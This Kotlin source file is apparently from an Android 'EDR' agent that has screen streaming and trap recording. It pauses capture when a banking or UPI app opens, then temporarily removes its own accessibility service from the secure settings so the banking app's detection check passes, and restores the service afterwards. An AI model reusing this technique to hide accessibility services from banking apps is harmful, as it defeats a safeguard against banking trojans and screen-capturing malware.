package com.edr.agent.policy

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.edr.agent.screen.AppTrapScreenRecorder
import com.edr.agent.screen.ScreenStreamManager
import com.edr.agent.service.EdrAccessibilityService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences

/**
 * AccessibilityAutoShield:
 *
 * Ensures Google Pay (GPay), UPI wallets, and banking apps NEVER fail with
 * "Payments blocked / Accessibility service detected":
 *
 * 1. Immediately stops active screenshots, screen streaming, and trap recording whenever a
 *    financial app opens.
 * 2. When WRITE_SECURE_SETTINGS is granted (e.g. via one-time ADB `pm grant`), cleanly
 *    suspends EDR Accessibility from ENABLED_ACCESSIBILITY_SERVICES while the banking app
 *    (or NPCI UPI PIN / biometric prompt) is on screen, and automatically restores it the
 *    moment the user returns to a non-banking app or Home screen.
 * 3. Preserves any other accessibility services the user may have enabled.
 */
object AccessibilityAutoShield {
    private const val TAG = "EdrBankShield"

    @Volatile
    private var nonFinancialConfirmTicks = 0

    @Volatile
    private var lastSuspendedPkg = ""

    fun canModifySecureSettings(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.WRITE_SECURE_SETTINGS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun getCanonicalComponentName(context: Context): String {
        return ComponentName(context, EdrAccessibilityService::class.java).flattenToString()
    }

    private fun getShortComponentName(context: Context): String {
        return ComponentName(context, EdrAccessibilityService::class.java).flattenToShortString()
    }

    private fun isOurServiceToken(context: Context, token: String): Boolean {
        val t = token.trim()
        if (t.isEmpty()) return false
        return t == getCanonicalComponentName(context) ||
            t == getShortComponentName(context) ||
            t.startsWith("${context.packageName}/")
    }

    fun isEdrAccessibilityEnabledInSystem(context: Context): Boolean {
        return try {
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            enabled.split(':').any { isOurServiceToken(context, it) }
        } catch (_: Exception) {
            EdrAccessibilityService.instance != null
        }
    }

    @Synchronized
    fun suspendForBankingApp(context: Context, financialPkg: String) {
        FinancialAppGuard.currentForegroundPkg = financialPkg
        FinancialAppGuard.isFinancialForegroundActive = true
        nonFinancialConfirmTicks = 0

        // Immediately block/stop live capture & trap screen recording on any banking screen
        if (ScreenStreamManager.isStreamingActive()) {
            Log.i(TAG, "Stopping active live screen stream because financial app opened ($financialPkg).")
            ScreenStreamManager.stopStreaming()
        }
        if (AppTrapScreenRecorder.isCurrentlyRecording()) {
            Log.i(TAG, "Stopping trap recording because financial app opened ($financialPkg).")
            AppTrapScreenRecorder.stopRecording(context.applicationContext)
        }

        val isEnabledNow = isEdrAccessibilityEnabledInSystem(context) || EdrAccessibilityService.instance != null
        if (!isEnabledNow) {
            return
        }

        if (!canModifySecureSettings(context)) {
            if (lastSuspendedPkg != financialPkg) {
                lastSuspendedPkg = financialPkg
                Log.w(
                    TAG,
                    "Banking app '$financialPkg' opened. WRITE_SECURE_SETTINGS not granted; relying on packageNames exclusion + screen shield. Grant via: adb shell pm grant ${context.packageName} android.permission.WRITE_SECURE_SETTINGS"
                )
            }
            return
        }

        try {
            val cr = context.contentResolver
            val rawEnabled = Settings.Secure.getString(
                cr,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val tokens = rawEnabled.split(':').map { it.trim() }.filter { it.isNotEmpty() }

            val matchedToken = tokens.firstOrNull { isOurServiceToken(context, it) }
                ?: getCanonicalComponentName(context)
            SyncPreferences.savedAccessibilityComponentToken = matchedToken
            SyncPreferences.isAccessibilityAutoPausedForBank = true

            val remaining = tokens.filterNot { isOurServiceToken(context, it) }
            val newSetting = remaining.joinToString(":")
            Settings.Secure.putString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, newSetting)
            Settings.Secure.putInt(cr, Settings.Secure.ACCESSIBILITY_ENABLED, if (remaining.isNotEmpty()) 1 else 0)

            lastSuspendedPkg = financialPkg
            Log.i(TAG, "Banking Shield ACTIVE: Temporarily suspended EDR Accessibility while '$financialPkg' is open.")
            EdrLocalStorage.appendEdrLog(
                context,
                "PRIVACY_SHIELD",
                "Banking shield paused Accessibility for $financialPkg so UPI/payments work uninterrupted."
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed suspending Accessibility for $financialPkg: ${e.message}", e)
        }
    }

    @Synchronized
    fun restoreAfterBankingApp(context: Context, reason: String) {
        FinancialAppGuard.isFinancialForegroundActive = false
        nonFinancialConfirmTicks = 0
        lastSuspendedPkg = ""

        if (!SyncPreferences.isAccessibilityAutoPausedForBank) {
            return
        }

        if (!canModifySecureSettings(context)) {
            SyncPreferences.isAccessibilityAutoPausedForBank = false
            return
        }

        try {
            val cr = context.contentResolver
            val rawEnabled = Settings.Secure.getString(
                cr,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val tokens = rawEnabled.split(':').map { it.trim() }.filter { it.isNotEmpty() }.toMutableList()

            val alreadyEnabled = tokens.any { isOurServiceToken(context, it) }
            if (!alreadyEnabled) {
                val savedToken = SyncPreferences.savedAccessibilityComponentToken
                    .takeIf { it.isNotBlank() }
                    ?: getCanonicalComponentName(context)
                tokens.add(savedToken)
                Settings.Secure.putString(
                    cr,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    tokens.joinToString(":")
                )
            }
            Settings.Secure.putInt(cr, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
            SyncPreferences.isAccessibilityAutoPausedForBank = false

            Log.i(TAG, "Banking Shield CLEARED ($reason): Restored EDR Accessibility automatically.")
            EdrLocalStorage.appendEdrLog(
                context,
                "PRIVACY_SHIELD",
                "Banking shield cleared ($reason): EDR Accessibility protection restored."
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed restoring Accessibility after banking: ${e.message}", e)
        }
    }

    /**
     * Polled frequently while screen is interactive whenever Accessibility Protection
     * is active or auto-paused for banking.
     */
    @Synchronized
    fun evaluateForegroundState(context: Context) {
        val pkg = FinancialAppGuard.queryLatestForegroundPackage(context, 4000L) ?: return

        if (FinancialAppGuard.isFinancialApp(context, pkg)) {
            nonFinancialConfirmTicks = 0
            suspendForBankingApp(context, pkg)
            return
        }

        if (FinancialAppGuard.isPaymentBridgeOrOverlay(pkg)) {
            // Keep banking session untouched during biometric / UPI PIN / system dialog transitions
            return
        }

        // Genuine non-banking foreground app
        FinancialAppGuard.currentForegroundPkg = pkg
        if (SyncPreferences.isAccessibilityAutoPausedForBank) {
            nonFinancialConfirmTicks++
            if (nonFinancialConfirmTicks >= 2) {
                restoreAfterBankingApp(context, "returned to $pkg")
            }
        } else {
            FinancialAppGuard.isFinancialForegroundActive = false
        }
    }
}
